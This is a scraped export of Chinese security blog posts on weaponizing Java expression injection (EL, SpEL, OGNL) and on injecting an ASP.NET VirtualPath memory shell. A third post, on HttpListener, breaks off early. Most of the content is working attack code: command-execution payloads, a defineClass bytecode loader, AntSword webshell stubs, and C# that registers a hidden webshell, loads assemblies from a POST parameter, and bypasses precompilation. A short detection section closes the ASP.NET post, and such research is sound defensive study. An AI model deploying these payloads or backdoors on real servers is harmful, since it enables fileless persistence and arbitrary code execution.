","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:0:0","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#"},{"categories":null,"content":"\r1 前言Java安全从业者能吃上饭的三个主要原因：反序列化，JNDI注入，表达式注入（开个玩笑）。本文想就这三种类型的漏洞的利用谈谈自己的看法，同时提出表达式注入下的武器化利用方法。 ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:1:0","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#前言"},{"categories":null,"content":"\r2 关于武器化在本人看来，漏洞武器化利用方式主要有以下几个特点 便捷性：一键式、傻瓜式操作。 通用性：兼容各种环境。 支持任意代码执行，而非单纯命令执行。 扩展性：联动其他工具。 目前大多数工具只是做到了任意命令执行，但是在实战中我们更希望得到一个任意代码执行的口子。原因是： 任意命令执行在进程命令行层面很容易留下痕迹被发现，而任意代码执行在语言函数层面，有天然的隐蔽的优势。 任意代码执行可以实现注入内存马等进阶操作。 反序列化漏洞在Java安全中的重要性无需多提，其中较为著名的漏洞有weblogic系列漏洞，shiro反序列化漏洞等。其中较为有名的利用工具有ysoserial，几乎是每一个入门Java安全的同学必须学习的一个项目。但实际上ysoserial只是做到了最基础的“命令执行”，并不支持任意代码执行。wh1t3p1g师傅的ysomap则进行了大量的改进。不仅增加了非常多的利用模块，而且增加了很多利用链下任意代码执行的利用方式。 JNDI注入。代表作Log4Shell，核弹漏洞。基础利用工具代表：marshalsec。武器化利用工具代表为feihong师傅的JNDIExploit。可以一键搭建ldap跟http环境，并且可以根据lookup对象的名称来执行动态的参数，还添加了一键注入内存马等功能。同样是做到了从任意命令执行到任意代码执行。 表达式注入漏洞。代表成员有Struts2的ognl表达式注入，SpringBoot spel表达式注入，Tomcat的EL表达式注入等。但是目前大多payload还是弹一个计算器，并没有见到成熟的武器化利用方式。 那么怎么才能实现表达式注入的武器化利用呢？ ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:2:0","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#关于武器化"},{"categories":null,"content":"\r3 中间层语言的选取Java中主流的表达式注入分为三种：EL，Spel，Ognl。不同表达式有不同的语法特点，有些必须要用反射去实例化类，有些可以直接new；有些表达式只能执行一句，有些可以执行多句。所以想要做到武器化利用就要选取一种通用的中间层语言。 自己曾经研究过一种基于JS引擎的Java一句话木马。其中JS引擎就非常符合我们的要求： 一行代码即可执行，无需执行多句 JDK\u003e=6都可以使用 Java函数层面，可以做到任意代码执行 自己在博客文章里面对js引擎的各种语法进行了详细的解释：https://yzddmr6.com/posts/%E4%B8%80%E7%A7%8D%E6%96%B0%E5%9E%8BJava%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0/ ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:3:0","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#中间层语言的选取"},{"categories":null,"content":"\r4 手工利用","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:4:0","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#手工利用"},{"categories":null,"content":"\r4.1 环境搭建Tomcat 8.5+jdk8 这里模拟了一个el表达式注入的场景 \u003c%@ page import=\"org.apache.jasper.runtime.PageContextImpl\" %\u003e \u003c% String res = (String) PageContextImpl.proprietaryEvaluate(request.getParameter(\"code\"), String.class, pageContext, null); out.print(res); %\u003e ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:4:1","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#环境搭建"},{"categories":null,"content":"\r4.2 无回显执行命令可能大家最常见到的就是执行命令的payload，由于el表达式不能执行new等操作，所以需要用反射来构造。 样例如下： code=${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"calc.exe\")} 或者是借助js引擎 code=${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"new+java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")} 不过两者都是无回显的，不优雅。 ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:4:2","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#无回显执行命令"},{"categories":null,"content":"\r4.3 有回显执行命令最早看到的有回显相关的研究是在这篇文章：https://forum.butian.net/share/886，写的非常好，最后的payload如下： ${pageContext.setAttribute(\"inputStream\", Runtime.getRuntime().exec(\"cmd /c dir\").getInputStream());Thread.sleep(1000);pageContext.setAttribute(\"inputStreamAvailable\", pageContext.getAttribute(\"inputStream\").available());pageContext.setAttribute(\"byteBufferClass\", Class.forName(\"java.nio.ByteBuffer\"));pageContext.setAttribute(\"allocateMethod\", pageContext.getAttribute(\"byteBufferClass\").getMethod(\"allocate\", Integer.TYPE));pageContext.setAttribute(\"heapByteBuffer\", pageContext.getAttribute(\"allocateMethod\").invoke(null, pageContext.getAttribute(\"inputStreamAvailable\")));pageContext.getAttribute(\"inputStream\").read(pageContext.getAttribute(\"heapByteBuffer\").array(), 0, pageContext.getAttribute(\"inputStreamAvailable\"));pageContext.setAttribute(\"byteArrType\", pageContext.getAttribute(\"heapByteBuffer\").array().getClass());pageContext.setAttribute(\"stringClass\", Class.forName(\"java.lang.String\"));pageContext.setAttribute(\"stringConstructor\", pageContext.getAttribute(\"stringClass\").getConstructor(pageContext.getAttribute(\"byteArrType\")));pageContext.setAttribute(\"stringRes\", pageContext.getAttribute(\"stringConstructor\").newInstance(pageContext.getAttribute(\"heapByteBuffer\").array()));pageContext.getAttribute(\"stringRes\")} 由于EL表达式不支持直接赋值以及new对象，所以需要用到pageContext.getAttribute跟pageContext.setAttribute来间接实现变量的传递，导致payload写起来非常的麻烦，也非常的臃肿。 所以我们换一种思路，不再使用EL自身的语法，而是在js引擎中实现我们的逻辑。 经过简化后，我们的payload如下： ${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var s = [3];s[0] = \\\"cmd\\\";s[1] = \\\"/c\\\";s[2] = \\\"whoami\\\";var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\\\"GBK\\\").useDelimiter(\\\"\\\\\\\\A\\\");var result = sc.hasNext() ? sc.next() : \\\"\\\";sc.close();result;\")} ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:4:3","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#有回显执行命令"},{"categories":null,"content":"\r4.4 任意代码执行在这里我们同样可以借助js引擎调用defineClass来实现任意代码执行的操作： code=${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(pageContext.request.getParameter(\"ant\"))} ant参数内容如下： try { load(\"nashorn:mozilla_compat.js\"); } catch (e) {} importPackage(Packages.java.util); importPackage(Packages.java.lang); importPackage(Packages.java.io); function Base64DecodeToByte(str) { importPackage(Packages.sun.misc); importPackage(Packages.java.util); var bt; try { bt = new BASE64Decoder().decodeBuffer(str); } catch (e) { bt = new Base64().getDecoder().decode(str); } return bt; } function define(Classdata, cmd) { var classBytes = Base64DecodeToByte(Classdata); var byteArray = Java.type(\"byte[]\"); var int = Java.type(\"int\"); var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod( \"defineClass\", byteArray.class, int.class, int.class ); defineClassMethod.setAccessible(true); var cc = defineClassMethod.invoke( Thread.currentThread().getContextClassLoader(), classBytes, 0, classBytes.length ); return cc.getConstructor(java.lang.String.class).newInstance(cmd); } define( \"yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==\", \"calc\" ); 其中字节码部分可以换为注入内存马的payload等等。 ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:4:4","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#任意代码执行"},{"categories":null,"content":"\r5 蚁剑改造之一键连接","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:5:0","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#蚁剑改造之一键连接"},{"categories":null,"content":"\r5.1 改造内容之前的jspjs类型必须要在上下文中绑定request跟response对象。但是在Spel跟ognl大多数情况下无法直接获取到这两个对象。于是便对jspjs类型进行了一些改动： 1、取消对外部request跟response的依赖。 2、以编码器的形式内置了利用的payload。 具体commit可以看： https://github.com/AntSwordProject/antSword/commit/797562b417271480628aa469789582a932318e47 原来的Shell必须要绑定request跟response对象 \u003c% try { new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(request.getParameter(\"ant\"), new javax.script.SimpleBindings(new java.util.HashMap() {{ put(\"response\", response); put(\"request\", request); }})); } catch (Exception e) { } %\u003e 经过改造后连绑定对象这一步也可以省去了，demo如下： \u003c% out.println(new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(request.getParameter(\"ant\")));; %\u003e 所以，现在不管是表达式还是什么场景，只要能够调用javax.script.ScriptEngineManager().getEngineByName(“js”).eval(xxx)这一句，理论上都可以用蚁剑进行无文件直接连接。 当然，现在的Shell跟之前的Shell并不冲突，两种都可以使用。有条件的话还是尽量使用第一种，原因后面会讲到。 ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:5:1","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#改造内容"},{"categories":null,"content":"\r5.2 EL表达式起一个Tomcat，el.jsp内容如下 \u003c% out.print(org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(request.getParameter(\"ant\"), String.class, pageContext, null)); %\u003e 打开蚁剑，选择el编码器，一键连接。 ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:5:2","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#el表达式"},{"categories":null,"content":"\r5.3 Spel表达式springboot设置一个测试环境，以spel为例 @RequestMapping(\"/spel\") public String eval(String spel){ SpelExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(spel); return expression.getValue().toString(); } 蚁剑选择spelbase64编码器可一键连接 至于为什么要加一层base64是因为发现如果直接发送的话，两个引号会被nashorn引擎吃掉成一个，然后报错。 ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:5:3","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#spel表达式"},{"categories":null,"content":"\r5.4 Ognl表达式以ognl为例 @RequestMapping(\"/ognl\") public String eval(String str) throws Exception { OgnlContext context = new OgnlContext(); Object ognl = Ognl.parseExpression(str); Object value = Ognl.getValue(ognl, context, context.getRoot()); return value.toString(); } 选择ognl编码器，一键连接 ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:5:4","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#ognl表达式"},{"categories":null,"content":"\r6 As-Exploits一键连接As-Exploits是蚁剑的后渗透模块，支持一键反弹Shell，一键注入内存马，一键加载ShellCode等操作。 在1.5版本中，增加了对jspjs类型的支持。 因为As-Exploits中jspjs的payload实际上是对jsp的payload又包了一层，而jsp的payload是硬编码了必须要依赖request跟response，所以如果想在表达式环境下使用，要先绑定request跟response对象，也就是第一种Shell的写法。 另外由于jdk6/7下的Rhino引擎过于傻逼，搞了一晚上解决了各种坑之后发现还是无法直接获取到Object.class(https://github.com/mozilla/rhino/issues/757)，所以在Rhino引擎下如何在js里调用defineClass还没有实现，如果有搞出来的师傅可以教教我。 基本信息模块 内存马管理模块 测试一下内存马注入功能，打进去一个antSword的filter。执行，提示成功 去内存马管理模块里看一下，发现已经注入成功 通过蚁剑就可以连接我们注入的内存马了。 ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:6:0","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#as-exploits一键连接"},{"categories":null,"content":"\r7 最后借助蚁剑，我们基本做到了对表达式注入的武器化利用。这样主要有3个作用： 漏洞的无文件利用。蚁剑的编码器其实有点类似于profile，可以自定义各种请求参数。根据不同场景自己改一改payload，即可达到对指定漏洞的无文件利用效果。本文不涉及具体漏洞的利用，感兴趣的同学可以自己研究。 表达式下的任意代码执行。原来的表达式注入大多是直接执行命令，属于命令执行层面很容易检测，懂得都懂。 构造webshell维权。原来jsp webshell主要局限在defineClass，现在可以通过各种表达式来构造webshell了，格局打开。 ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:7:0","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#最后"},{"categories":null,"content":"\r8 参考https://paper.seebug.org/794/ https://xz.aliyun.com/t/9245 http://yzddmr6.com/posts/%E4%B8%80%E7%A7%8D%E6%96%B0%E5%9E%8BJava%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0/ ","date":"2022-06-11","objectID":"/posts/java-expression-exploit/:8:0","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/#参考"},{"categories":null,"content":" 本文首发于：https://tttang.com/archive/1488/ ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:0:0","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#"},{"categories":null,"content":"\r1 前言asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。 文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。 今天讲一讲最古老也是适用性最广泛的一种内存马：虚拟文件内存马。 ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:1:0","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#前言"},{"categories":null,"content":"\r2 VirtualPathProviderASP.NET有一个特殊功能叫做虚拟文件，可以映射一个不存在于服务器的文件系统，并且能够对其动态编译并提供访问服务。主要的功能类是System.Web.Hosting.VirtualPathProvider。 https://docs.microsoft.com/zh-cn/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8 VirtualPathProvider类提供一组方法，用于实现 Web 应用程序的虚拟文件系统。 在虚拟文件系统中，文件和目录由服务器操作系统提供的文件系统外的其他数据存储管理。 例如，可以使用虚拟文件系统将内容存储在SQL Server数据库中。 可以将请求处理的任何文件存储在虚拟文件系统中。 这包括： ASP.NET 页、母版页、用户控件和其他对象。 具有扩展名的标准网页，例如.htm.jpg。 映射到 实例的任何自定义 BuildProvider 扩展。 文件夹中的任何命名 App_Theme 主题。 根据官方文档我们可以看到，我们是可以映射一个物理上不存在的ASP.NET页到URL中，这也是我们本文所讲的内存马的原理。 ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:2:0","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#virtualpathprovider"},{"categories":null,"content":"\r2.1 编写内存马VirtualPathProvider是一个抽象类，我们需要继承这个类然后编写自己的逻辑。 其中我们要实现以下两个函数： FileExists(String) GetFile(String) 其中FileExists的功能是告诉Web Server请求到一个什么样的路径可以认为命中了该缓存文件，可以理解为Java内存马中的URL Pattern。 GetFile函数是告诉Web Server命中URL后返回一个什么样的文件。返回一个System.Web.Hosting.VirtualFile对象 using System.IO; namespace System.Web.Hosting { public abstract class VirtualFile : VirtualFileBase { protected VirtualFile(string virtualPath) =\u003e this._virtualPath = VirtualPath.Create(virtualPath); public override bool IsDirectory =\u003e false; public abstract Stream Open(); } } VirtualFile是个抽象类，同样我们需要继承。其中需要实现的是Open方法，返回一个流对象，这里是我们要返回构造的内存马的内容。 yso.net中的代码是参考了官方的写法，其实有很多部分是不必要的。进行简化后，我们内存马部分的代码如下： public class SamplePathProvider : System.Web.Hosting.VirtualPathProvider { private string _virtualDir; private string _fileContent; public SamplePathProvider(string virtualDir, string fileContent) : base() { _virtualDir = virtualDir; _fileContent = fileContent; } private bool IsPathVirtual(string virtualPath) { System.String checkPath = System.Web.VirtualPathUtility.ToAppRelative(virtualPath); return checkPath.ToLower().Contains(_virtualDir.ToLower()); } public override bool FileExists(string virtualPath) { if (IsPathVirtual(virtualPath)) { return true; } else { return Previous.FileExists(virtualPath); } } public override System.Web.Hosting.VirtualFile GetFile(string virtualPath) { if (IsPathVirtual(virtualPath)) return new SampleVirtualFile(virtualPath, _fileContent); else return Previous.GetFile(virtualPath); } } public class SampleVirtualFile : System.Web.Hosting.VirtualFile { private string _fileContent; public bool Exists { get { return true; } } public SampleVirtualFile(string virtualPath, string fileContent) : base(virtualPath) { this._fileContent = fileContent; } public override System.IO.Stream Open() { System.IO.Stream stream = new System.IO.MemoryStream(System.Text.Encoding.UTF8.GetBytes(_fileContent)); return stream; } } ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:2:1","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#编写内存马"},{"categories":null,"content":"\r2.2 注入内存马根据官方文档，我们可以调用HostingEnvironment.RegisterVirtualPathProvider(Provider)来注入我们的虚拟文件系统。查看源码如下： public static void RegisterVirtualPathProvider(VirtualPathProvider virtualPathProvider) { if (HostingEnvironment._theHostingEnvironment == null) throw new InvalidOperationException(); if (BuildManager.IsPrecompiledApp) return; HostingEnvironment.RegisterVirtualPathProviderInternal(virtualPathProvider); } 可以看到首先判断当前_theHostingEnvironment是否为空，这个对象的作用后面会讲到。 然后判断当前是否是一个预编译项目，如果是的话就退出，否则就调用一个internal方法RegisterVirtualPathProviderInternal。查看源码如下： internal static void RegisterVirtualPathProviderInternal(VirtualPathProvider virtualPathProvider) { VirtualPathProvider virtualPathProvider1 = HostingEnvironment._theHostingEnvironment._virtualPathProvider;//获取原来的VPP对象 HostingEnvironment._theHostingEnvironment._virtualPathProvider = virtualPathProvider;//把指针指向新注册的VPP对象 virtualPathProvider.Initialize(virtualPathProvider1);//调用新注册VPP的Initialize } internal virtual void Initialize(VirtualPathProvider previous) { this._previous = previous;//把原有的vpp设置为当前vpp的上一个节点 this.Initialize(); } 在这里，我们可以看到整个VirtualPathProvider生效使用了单项链表的结构，每注册一个VPP都会把当前指针指到新注册的VPP对象，然后把原有的VPP设为当前VPP的上一个节点。然后在新的Web请求到来时，Web Server会从最新的节点开始，逐个遍历链表上的所有节点，直到previous为null。 还有一个点需要注意，由于VirtualPathProvider继承了MarshalByRefObject，MarshalByRefObject有一个InitializeLifetimeService方法，作用是获取生存期服务对象来控制此实例的生存期策略。所以为了保持我们的内存马一直保持存活状态，我们可以调用VirtualPathProvider.InitializeLifetimeService方法来将其置空，从而防止创建限制对象生存期VirtualPathProvider的租约。 综上所述，我们的注入部分代码如下： string webshellContentsBase64 = \"SSBhbSBhIFdlYlNoZWxsPCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiJT48JWV2YWwoUmVxdWVzdC5JdGVtWyJhbnQiXSwidW5zYWZlIik7JT4=\"; string webshellType = \".aspx\"; string webshellContent = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(webshellContentsBase64)); string targetVirtualPath = \"/yzddmr6.aspx\"; try { SamplePathProvider sampleProvider = new SamplePathProvider(targetVirtualPath, webshellContent); HostingEnvironment.RegisterVirtualPathProvider(sampleProvider); sampleProvider.InitializeLifetimeService(); } catch (System.Exception error) { Console.WriteLine(error); } ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:2:2","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#注入内存马"},{"categories":null,"content":"\r2.3 测试注入之前，访问/yzddmr6.aspx返回404错误 注入内存马，一片空白表示注入成功 再次访问/yzddmr6.aspx，内存马成功植入，我们已经可以执行任意命令了 ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:2:3","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#测试"},{"categories":null,"content":"\r3 进阶思考以上是参考官方文档后的标准写法，是否存在优化的空间呢？ ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:3:0","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#进阶思考"},{"categories":null,"content":"\r3.1 注入代码的位置在之前内存马文章中我提到过https://tttang.com/archive/1420/，我们只要在任意一个可以被每次请求触发的位置加入我们的逻辑即可做到内存马的效果。所以我们并不是一定非要按照官方文档实现一个VirtualFile对象，触发路径什么的其实对于我们来说也并不是必选项。 因为每次请求都需要去判断文件是否存在，所以理所应当就想到了把内存马注入到FileExists方法中。后来看了下哥斯拉的内存马是插在GetCacheKey方法里。我们当然希望我们的内存马是作为最高优先级被访问。这里我给两个函数都下个断点，看哪个先被命中，就知道哪个优先级比较高了。 看起来iis会先调用System.Web.Compilation.BuildManager.GetCacheKeyFromVirtualPath来获取当前的CacheKey，然后才会去触发FileExists方法。 经过进一步优化之后，我们仅重写了GetCacheKey一个方法，就实现内存马了的效果。 public class SamplePathProvider : System.Web.Hosting.VirtualPathProvider { public override string GetCacheKey(string virtualPath) { try { HttpContext context = HttpContext.Current; String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } } catch (Exception e) { Console.WriteLine(e); } return Previous.GetCacheKey(virtualPath); } } ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:3:1","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#注入代码的位置"},{"categories":null,"content":"\r3.2 绕过预编译在官方文档有一句话： If a Web site is precompiled for deployment, content provided by a VirtualPathProvider instance is not compiled, and no VirtualPathProvider instances are used by the precompiled site. 并且在之前HostingEnvironment.RegisterVirtualPathProvider会判断当前BuildManager.IsPrecompiledApp是否为true。所以当目标网站是预编译发布的模式，我们需要利用反射来绕过预编译。 System.Reflection.FieldInfo field_isPrecompiledAppComputed = null; System.Reflection.FieldInfo field_isPrecompiledApp = null; object field_theBuildManager_instance = null; object field_isPrecompiledAppComputed_oldValue = null; object field_isPrecompiledApp_oldValue = null; var typeBuildManager = typeof(System.Web.Compilation.BuildManager); System.Reflection.FieldInfo field_theBuildManager = typeBuildManager.GetField(\"_theBuildManager\", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic); field_isPrecompiledAppComputed = typeBuildManager.GetField(\"_isPrecompiledAppComputed\", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic); field_isPrecompiledApp = typeBuildManager.GetField(\"_isPrecompiledApp\", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic); field_theBuildManager_instance = field_theBuildManager.GetValue(null); field_isPrecompiledApp_oldValue = field_isPrecompiledApp.GetValue(field_theBuildManager_instance); if ((bool) field_isPrecompiledApp_oldValue) { // To disable isPrecompiledApp settings field_isPrecompiledAppComputed.SetValue(field_theBuildManager_instance, true); field_isPrecompiledApp.SetValue(field_theBuildManager_instance, false); } ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:3:2","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#绕过预编译"},{"categories":null,"content":"\r3.3 绕过FriendlyUrlasp.net有个功能叫做FriendlyUrls，可以省略后缀.aspx，主要可能用于seo优化 可以通过RouteTable.Routes.EnableFriendlyUrls()开启。 yso.net中给出了绕过的payload如下： foreach (var route in System.Web.Routing.RouteTable.Routes) { if (route.GetType().FullName == \"Microsoft.AspNet.FriendlyUrls.FriendlyUrlRoute\") { var FriendlySetting = route.GetType().GetProperty(\"Settings\", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.Public); var settings = new Microsoft.AspNet.FriendlyUrls.FriendlyUrlSettings(); settings.AutoRedirectMode = Microsoft.AspNet.FriendlyUrls.RedirectMode.Off; FriendlySetting.SetValue(route, settings); } } ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:3:3","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#绕过friendlyurl"},{"categories":null,"content":"\r3.4 测试注入我们的内存马之后，访问任意一个原本存在的aspx页面，使用蚁剑即可连接。 ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:3:4","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#测试-1"},{"categories":null,"content":"\r4 检测内存马本人写了个小脚本 ASP.NET-Memshell-Scanner，可用于各类内存马的检测。 下载项目中的检测脚本 https://github.com/yzddmr6/ASP.NET-Memshell-Scanner/blob/master/aspx-memshell-scanner.aspx，放到网站目录下，浏览器访问。 其中id为1的是本文后一种注入方法，id为2的是前一种注入方法。前一种注入方法可以通过类成员来获取注入的路径跟实现的内容。 可以根据CodeBase的地址获得dll，用dnspy打开，找到类名对应的文件，发现恶意代码，即可确认被注入了内存马。 ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:4:0","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#检测内存马"},{"categories":null,"content":"\r5 参考https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs https://docs.microsoft.com/zh-cn/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8 https://www.codeguru.com/dotnet/using-friendly-urls-in-asp-net-web-forms/ ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-virtualpath/:5:0","series":null,"tags":null,"title":"ASP.NET下的内存马(四) VirtualPath内存马","uri":"/posts/asp-net-memory-shell-virtualpath/#参考"},{"categories":["技术文章"],"content":" 本文首发于：https://tttang.com/archive/1451/ ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:0:0","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#"},{"categories":["技术文章"],"content":"\r1 前言asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。 文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。 今天讲一种特殊的内存马：基于HttpListener实现的内存马。 ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:1:0","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#前言"},{"categories":["技术文章"],"content":"\r2 关于HttpListenerHttpListener进一步的简化了Http协议的监听，仅需通过字符串的方法提供监听的地址和端口号以及虚拟路径，就可以开始监听工作了。与 IIS 上发布网站相比，使用 HttpListener 编程的程序更加轻量化，易于发布和更新。配合 Thread 或 Task 类也可以支持一定的并发。 HttpListener的全限定类名是System.Net.HttpListener，这个类的主要作用就是启动一个简单的Web Server。个人理解就类似python的python -m http.server一样，可以很快启动一个简单的Http服务。在这里可以看到他的官方文档：https://docs.microsoft.com/zh-cn/dotnet/api/system.net.httplistener?view=net-6.0 